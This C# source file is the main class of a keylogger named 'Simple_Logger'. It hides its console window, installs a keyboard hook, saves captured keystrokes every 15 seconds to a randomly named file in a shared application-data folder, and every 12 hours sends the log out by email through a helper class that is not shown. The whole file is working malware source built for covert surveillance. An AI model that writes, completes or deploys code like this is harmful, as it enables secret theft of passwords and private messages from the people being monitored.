using System;
using System.Collections.Generic;
using System.IO;
using System.Windows.Forms;
using System.Reactive.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace Simple_Logger
{
    internal class Logger
    {
        // DLL imports to hide console window

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private const int SW_HIDE = 0;

        // Used to store keystrokes

        public static List<string> Keys = new List<string>();

        // Initialize the directory used to store keystrokes in

        private static string InitializeDirectory()
        {
            var folderPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Log Data");

            try
            {
                Directory.CreateDirectory(folderPath);
            }

            catch
            {
                // If a directory cannot be created terminate the instance

                Environment.Exit(0);
            }

            return folderPath;
        }

        // Initialize the file used to store keystrokes for the session
        
        private static string InitializeLogFile()
        {
            var folderPath = InitializeDirectory();

            // Generate a new log file

            var logFile = Path.GetRandomFileName();

            var filePath = String.Format(folderPath + "\\{0}", logFile);

            if (!File.Exists(filePath))
            {
                File.Create(filePath).Close();
            }

            else
            {
                logFile = Path.GetRandomFileName();

                filePath = String.Format(folderPath + "\\{0}", logFile);

                File.Create(filePath).Close();
            }

            return filePath;
        }

        // Start logging keystrokes

        public static void Main()
        {
            // Hide the console window on session start

            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            var filePath = InitializeLogFile();

            // Write keystrokes to file every 15 seconds

            Observable.Timer(TimeSpan.FromSeconds(15), TimeSpan.FromSeconds(15)).Subscribe(x =>
            {
                WriteToFile(filePath);
            });

            // Send an email every 12 hours

            Observable.Timer(TimeSpan.FromHours(12), TimeSpan.FromHours(12)).Subscribe(x =>
            {
                // Read keystrokes from file

                var keystrokes = ReadFromFile(filePath);

                // Send an email

                Email.SendEmail(keystrokes);
            });

            Hook._hookId = Hook.SetHook(Hook.Proc);
            Application.Run();

            Hook.UnhookWindowsHookEx(Hook._hookId);

        }

        // Write keystrokes to file

        private static void WriteToFile(string filePath)
        {
            var keystrokes = new StringBuilder();

            foreach (var key in Keys)
            {
                keystrokes.AppendLine(key);
            }

            try
            {
                File.WriteAllText(filePath, keystrokes.ToString());
            }

            catch
            {
                // If keystrokes cannot be written to file terminate the session

                Environment.Exit(0);
            }

            // Remove keystrokes that have been written to file from storage

            Keys.Clear();
        }

        // Read keystrokes from file

        private static string ReadFromFile(string filePath)
        {
            var keystrokes = File.ReadAllText(filePath);

            return keystrokes;
        }
    }
}
